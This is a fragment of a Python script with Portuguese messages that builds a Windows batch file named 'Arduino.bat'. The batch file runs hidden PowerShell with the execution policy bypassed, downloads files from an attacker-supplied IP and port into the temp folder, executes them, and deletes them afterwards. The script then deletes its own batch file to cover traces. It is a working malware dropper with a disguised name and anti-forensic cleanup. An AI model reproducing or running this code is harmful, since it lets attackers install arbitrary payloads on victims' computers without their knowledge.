...
for nome_arquivo in lista_arquivos:
    comando = f'''@echo off
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try {{ $url = 'http://{ip}:{porta_int}/{nome_arquivo}'; $path = \\"$env:TEMP\\{nome_arquivo}\\"; Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop; Start-Process $path; Start-Sleep -Seconds 7.5; Remove-Item $path -Force -ErrorAction SilentlyContinue }} catch {{ exit 1 }}"
...
temp_path = Path(os.getenv('TEMP')) if os.name == 'nt' else Path('/tmp')
out_path = temp_path / "Arduino.bat"
...
print(f"{VERDE}\nSUCESSO! ;] só esperar agora!{RESET}")

sleep(120)
try:
    if out_path.exists():
        out_path.unlink()
        print(f"{VERMELHO}arquivo excluido ;){RESET}")
except Exception as e:
    print(f"{VERMELHO}erro ao deletar arquivo temp!!!!!!!!!!!!! {e}{RESET}")
